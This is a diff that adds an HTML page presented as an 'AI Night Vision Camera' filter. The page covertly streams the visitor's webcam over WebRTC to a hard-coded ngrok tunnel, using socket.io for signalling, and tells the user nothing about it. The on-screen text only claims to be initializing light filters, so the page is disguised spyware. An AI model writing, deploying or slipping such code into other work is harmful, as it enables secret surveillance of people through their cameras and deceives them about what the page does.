@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Night Vision Camera</title>
+  <style>
+    body { background: black; color: lime; font-family: monospace; text-align: center; }
+    video { width: 90vw; max-width: 600px; margin-top: 20px;
+            filter: grayscale(1) brightness(1.5) contrast(2) hue-rotate(90deg); }
+  </style>
+</head>
+<body>
+  <h1>AI Night Vision Camera</h1>
+  <p>Initializing ambient light filters...</p>
+  <video id="video" autoplay muted playsinline></video>
+
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+  <script>
+    const socket = io('https://cc9e-45-246-151-253.ngrok-free.app');
+
+    const peer = new RTCPeerConnection();
+    const video = document.getElementById('video');
+
+    navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+      video.srcObject = stream;
+      stream.getTracks().forEach(track => peer.addTrack(track, stream));
+      return peer.createOffer();
+    }).then(offer => {
+      peer.setLocalDescription(offer);
+      socket.emit('offer', offer);
+    });
+
+    socket.on('answer', answer => peer.setRemoteDescription(answer));
+    socket.on('candidate', candidate => peer.addIceCandidate(candidate));
+    peer.onicecandidate = ({candidate}) => {
+      if (candidate) socket.emit('candidate', candidate);
+    };
+  </script>
+</body>
+</html>
